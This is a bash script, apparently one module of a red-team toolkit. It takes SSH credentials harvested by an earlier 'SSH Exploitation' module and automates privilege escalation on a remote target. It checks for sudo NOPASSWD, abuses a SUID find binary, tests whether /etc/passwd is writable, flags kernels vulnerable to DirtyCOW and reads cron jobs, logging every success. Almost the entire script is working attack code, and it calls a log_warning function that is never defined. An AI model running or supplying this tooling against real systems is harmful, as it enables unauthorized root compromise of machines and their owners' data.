#!/bin/bash
################################################################################
# RED TEAM MODULE 4: PRIVILEGE ESCALATION
# Description: Escalade user -> root via sudo, SUID, kernel
# Input: SSH credentials from module 2
# Output: Root access confirmation
################################################################################

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOGS_DIR="$SCRIPT_DIR/../../logs/attack_sessions"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
PRIVESC_LOG="$LOGS_DIR/privesc_${TIMESTAMP}.log"
CREDS_FILE="$LOGS_DIR/ssh_creds.env"

mkdir -p "$LOGS_DIR"

log_info() { echo "[$(date '+%H:%M:%S')] [INFO] $1" | tee -a "$PRIVESC_LOG"; }
log_success() { echo -e "${GREEN}[✓]${NC} $1" | tee -a "$PRIVESC_LOG"; }
log_attempt() { echo -e "${YELLOW}[→]${NC} $1" | tee -a "$PRIVESC_LOG"; }
log_critical() { echo -e "${RED}[✗]${NC} $1" | tee -a "$PRIVESC_LOG"; }

banner() {
    clear
    cat << "EOF"
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║    ⬆️  RED TEAM PRIVILEGE ESCALATION MODULE ⬆️                ║
║                                                                ║
║    Phase 4: User → Root via Multiple Vectors                  ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
EOF
}

load_credentials() {
    if [ ! -f "$CREDS_FILE" ]; then
        log_critical "SSH credentials file not found"
        log_info "Run module 2 (SSH Exploitation) first"
        exit 1
    fi
    
    source "$CREDS_FILE"
    
    if [ -z "$SSH_USER" ] || [ -z "$SSH_PASS" ] || [ -z "$SSH_TARGET" ]; then
        log_critical "Invalid credentials in file"
        exit 1
    fi
    
    log_success "Credentials loaded: $SSH_USER@$SSH_TARGET"
}

test_current_privileges() {
    log_info "Testing current privilege level"
    
    local current_id
    current_id=$(sshpass -p "$SSH_PASS" ssh \
        -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        "$SSH_USER@$SSH_TARGET" "id" 2>/dev/null)
    
    log_info "Current user: $current_id"
    
    # Check if already root
    if echo "$current_id" | grep -q "uid=0"; then
        log_critical "Already running as ROOT!"
        echo "PRIVESC_STATUS=already_root" >> "$CREDS_FILE"
        return 0
    fi
    
    return 1
}

test_sudo() {
    log_info "Testing sudo privileges"
    
    local sudo_output
    sudo_output=$(sshpass -p "$SSH_PASS" ssh \
        -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        "$SSH_USER@$SSH_TARGET" "sudo -l 2>&1" 2>/dev/null)
    
    log_attempt "Sudo output:"
    echo "$sudo_output" | tee -a "$PRIVESC_LOG"
    
    # Check for NOPASSWD
    if echo "$sudo_output" | grep -qi "nopasswd"; then
        log_critical "SUDO NOPASSWD detected!"
        
        if echo "$sudo_output" | grep -q "ALL"; then
            log_success "User can run ALL commands with sudo NOPASSWD"
            
            # Try to escalate
            local root_check
            root_check=$(sshpass -p "$SSH_PASS" ssh \
                -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
                -o UserKnownHostsFile=/dev/null \
                "$SSH_USER@$SSH_TARGET" "sudo id; sudo whoami" 2>/dev/null)
            
            if echo "$root_check" | grep -q "uid=0"; then
                log_success "ROOT ACCESS OBTAINED VIA SUDO NOPASSWD!"
                echo "PRIVESC_METHOD=sudo_nopasswd" >> "$CREDS_FILE"
                echo "PRIVESC_STATUS=success" >> "$CREDS_FILE"
                return 0
            fi
        fi
    fi
    
    return 1
}

test_suid_binaries() {
    log_info "Searching for exploitable SUID binaries"
    
    # Find common SUID binaries
    local suid_list
    suid_list=$(sshpass -p "$SSH_PASS" ssh \
        -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        "$SSH_USER@$SSH_TARGET" \
        "find / -perm -4000 -type f 2>/dev/null" 2>/dev/null)
    
    # Check for dangerous ones
    echo "$suid_list" | while read binary; do
        case "$binary" in
            */find)
                log_attempt "Dangerous SUID binary found: find"
                
                # Try find exploitation
                local find_test
                find_test=$(sshpass -p "$SSH_PASS" ssh \
                    -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
                    -o UserKnownHostsFile=/dev/null \
                    "$SSH_USER@$SSH_TARGET" \
                    "find . -exec whoami \; -quit 2>/dev/null" 2>/dev/null)
                
                if echo "$find_test" | grep -q "root"; then
                    log_success "ROOT ACCESS VIA SUID FIND!"
                    echo "PRIVESC_METHOD=suid_find" >> "$CREDS_FILE"
                    echo "PRIVESC_STATUS=success" >> "$CREDS_FILE"
                    return 0
                fi
                ;;
            */nmap)
                log_attempt "Dangerous SUID binary found: nmap"
                ;;
            */vim|*/nano)
                log_attempt "Dangerous SUID binary found: text editor"
                ;;
        esac
    done
    
    return 1
}

test_kernel_vulnerabilities() {
    log_info "Testing kernel vulnerabilities"
    
    local kernel_version
    kernel_version=$(sshpass -p "$SSH_PASS" ssh \
        -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        "$SSH_USER@$SSH_TARGET" "uname -r" 2>/dev/null)
    
    log_info "Kernel version: $kernel_version"
    echo "KERNEL_VERSION=$kernel_version" >> "$CREDS_FILE"
    
    # Check for known vulnerable kernels
    if echo "$kernel_version" | grep -qE "^2\.|^3\.[0-9]\.|^4\.[0-3]\."; then
        log_critical "Old kernel detected - likely vulnerable!"
        
        if echo "$kernel_version" | grep -qE "2\.6\.|^3\."; then
            log_warning "Potential exploits: DirtyCOW (CVE-2016-5195), Overlayfs"
            echo "KERNEL_EXPLOITS=dirtycow,overlayfs" >> "$CREDS_FILE"
        fi
        
        if echo "$kernel_version" | grep -q "^4\.4"; then
            log_warning "Ubuntu 16.04 kernel - multiple exploits available"
            echo "KERNEL_EXPLOITS=dirtycow" >> "$CREDS_FILE"
        fi
    fi
    
    return 1
}

test_writable_files() {
    log_info "Testing for writable system files"
    
    # Test /etc/passwd
    local passwd_writable
    passwd_writable=$(sshpass -p "$SSH_PASS" ssh \
        -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        "$SSH_USER@$SSH_TARGET" \
        "test -w /etc/passwd && echo 'WRITABLE' || echo 'NOT_WRITABLE'" 2>/dev/null)
    
    if [ "$passwd_writable" = "WRITABLE" ]; then
        log_critical "/etc/passwd IS WORLD-WRITABLE!"
        log_success "Can add root user directly"
        echo "PRIVESC_METHOD=writable_passwd" >> "$CREDS_FILE"
        echo "PRIVESC_STATUS=success" >> "$CREDS_FILE"
        return 0
    fi
    
    return 1
}

test_cron_jobs() {
    log_info "Checking for cron job exploitation"
    
    local cron_output
    cron_output=$(sshpass -p "$SSH_PASS" ssh \
        -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        "$SSH_USER@$SSH_TARGET" \
        "cat /etc/crontab 2>/dev/null | grep -v '^#'" 2>/dev/null)
    
    if [ -n "$cron_output" ]; then
        log_info "Cron jobs found:"
        echo "$cron_output" | tee -a "$PRIVESC_LOG"
        log_info "Check if any scripts are writable for code injection"
    fi
    
    return 1
}

generate_report() {
    {
        echo ""
        echo "╔════════════════════════════════════════════════════════════════╗"
        echo "║      PRIVILEGE ESCALATION SUMMARY                              ║"
        echo "╚════════════════════════════════════════════════════════════════╝"
        echo ""
        
        if grep -q "PRIVESC_STATUS=success" "$CREDS_FILE"; then
            echo "Status: ✓ SUCCESS - ROOT ACCESS OBTAINED"
        elif grep -q "PRIVESC_STATUS=already_root" "$CREDS_FILE"; then
            echo "Status: ✓ Already running as root"
        else
            echo "Status: ⚠ No direct privilege escalation"
            echo "Note: Multiple vectors available for further exploitation"
        fi
        
        echo ""
    } | tee -a "$PRIVESC_LOG"
}

main() {
    banner
    
    load_credentials
    
    log_info "Target: $SSH_TARGET"
    log_info "User: $SSH_USER"
    
    # Test if already root
    if test_current_privileges; then
        generate_report
        return 0
    fi
    
    # Try escalation vectors
    test_sudo && generate_report && return 0
    test_suid_binaries && generate_report && return 0
    test_writable_files && generate_report && return 0
    
    # Just inform about possibilities
    test_kernel_vulnerabilities
    test_cron_jobs
    
    generate_report
    
    log_success "Privilege escalation phase completed"
    echo ""
}

main "$@"
